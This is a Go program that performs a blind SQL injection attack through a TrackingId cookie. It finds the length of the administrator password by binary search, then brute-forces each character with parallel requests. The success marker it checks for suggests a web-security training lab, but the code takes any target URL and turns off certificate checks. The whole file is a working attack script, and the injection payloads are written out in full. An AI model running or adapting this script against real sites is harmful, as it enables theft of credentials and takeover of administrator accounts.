package main

// This program tries to guess the administrator password with a web request attack.
// It asks the user for the target website and cookie values, then sends many requests
// to figure out the password length and each password character.

import (
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
	"time"
)

// targetURL is the website address we will test.
var targetURL string

// sessionCookies stores the two cookie values we need to send with each request.
var sessionCookies = map[string]string{
    "TrackingId": "",
    "session":    "",
}

// charset is the list of characters we try for each password position.
var charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

// newClient creates and returns a reusable HTTP client.
// This client will skip TLS certificate verification, which is needed for some test sites.
func newClient() *http.Client {
    transport := &http.Transport{
        TLSClientConfig:       &tls.Config{InsecureSkipVerify: true},
        MaxIdleConns:          100,
        MaxIdleConnsPerHost:   100,
        IdleConnTimeout:       90 * time.Second,
        DisableCompression:    true,
        ForceAttemptHTTP2:     true,
    }
    return &http.Client{
        Transport: transport,
        Timeout:   12 * time.Second,
    }
}

// sendRequest sends a GET request to the target URL with the given cookies.
// It returns the text body of the response so the program can look for the success message.
func sendRequest(client *http.Client, cookieHeader string) (string, error) {
    req, err := http.NewRequest("GET", targetURL, nil)
    if err != nil {
        return "", err
    }
    req.Header.Set("Cookie", cookieHeader)
    resp, err := client.Do(req)
    if err != nil {
        return "", err
    }
    defer resp.Body.Close()

    body, err := io.ReadAll(resp.Body)
    if err != nil {
        return "", err
    }
    return string(body), nil
}

// buildCookie constructs the Cookie header text needed for each request.
// It includes the TrackingId plus the SQL payload, and the session cookie.
func buildCookie(payload string) string {
    return fmt.Sprintf("TrackingId=%s; session=%s", sessionCookies["TrackingId"]+payload, sessionCookies["session"])
}

// lengthGreaterThan checks whether the administrator password length is greater than mid.
// It returns true if the page response contains the success text.
func lengthGreaterThan(client *http.Client, mid int) (bool, error) {
    payload := fmt.Sprintf("' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')>%d--", mid)
    cookieHeader := buildCookie(payload)
    body, err := sendRequest(client, cookieHeader)
    if err != nil {
        return false, err
    }
    return strings.Contains(body, "Welcome back!"), nil
}

// getLength finds the password length using a faster binary search method.
// It asks whether the password is longer than a midpoint, then narrows the range.
func getLength(client *http.Client) (int, error) {
    low, high := 1, 100
    for low < high {
        mid := (low + high) / 2
        ok, err := lengthGreaterThan(client, mid)
        if err != nil {
            fmt.Printf("[!] Request error checking length>%d: %v\n", mid, err)
            continue
        }
        if ok {
            low = mid + 1
        } else {
            high = mid
        }
    }
    fmt.Printf("[+] Found length of administrator password: %d\n", low)
    return low, nil
}

// getPassword guesses the administrator password one character at a time.
// It uses many workers in parallel to test many characters faster.
func getPassword(client *http.Client, length int) (string, error) {
    var password strings.Builder
    workerCount := 20

    for i := 1; i <= length; i++ {
        // Create a cancelable context so we can stop workers when the correct character is found.
        ctx, cancel := context.WithCancel(context.Background())
        resultCh := make(chan rune, 1)
        errCh := make(chan error, workerCount)
        charCh := make(chan rune, len(charset))

        var wg sync.WaitGroup
        for w := 0; w < workerCount; w++ {
            wg.Add(1)
            go func() {
                defer wg.Done()
                for c := range charCh {
                    select {
                    case <-ctx.Done():
                        return
                    default:
                    }
                    payload := fmt.Sprintf("' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),%d,1)='%c'--", i, c)
                    cookieHeader := buildCookie(payload)
                    body, err := sendRequest(client, cookieHeader)
                    if err != nil {
                        errCh <- err
                        continue
                    }
                    if strings.Contains(body, "Welcome back!") {
                        select {
                        case resultCh <- c:
                            cancel()
                            return
                        default:
                        }
                        return
                    }
                }
            }()
        }

        for _, c := range charset {
            charCh <- c
        }
        close(charCh)

        go func() {
            wg.Wait()
            close(resultCh)
            close(errCh)
        }()

        foundChar := rune(0)
        select {
        case c, ok := <-resultCh:
            if ok {
                foundChar = c
            }
        case <-ctx.Done():
        }

        cancel()
        if foundChar == 0 {
            return password.String(), fmt.Errorf("could not find character at position %d", i)
        }
        password.WriteRune(foundChar)
        fmt.Printf("[+] Found character %d of administrator password: %c\n", i, foundChar)
    }
    return password.String(), nil
}

// readInput shows a prompt and reads one line of text from the user.
func readInput(prompt string) string {
    var value string
    fmt.Print(prompt)
    fmt.Scanln(&value)
    return strings.TrimSpace(value)
}

func main() {
    // Ask the user for the website and cookie values.
    targetURL = readInput("Enter target URL: ")
    sessionCookies["TrackingId"] = readInput("Enter TrackingId cookie value: ")
    sessionCookies["session"] = readInput("Enter session cookie value: ")

    client := newClient()

    // First find the password length.
    length, err := getLength(client)
    if err != nil {
        fmt.Println("[!] Failed to determine password length:", err)
        return
    }
    fmt.Printf("[+] Length of administrator password is: %d\n", length)

    // Next use that length to find the password one character at a time.
    password, err := getPassword(client, length)
    if err != nil {
        fmt.Println("[!] Failed to brute-force password:", err)
        return
    }
    fmt.Printf("[+] Brute-forced administrator password: %s\n", password)
}

// made by copilot not me
// make for fast brute force attack using goroutines and channels
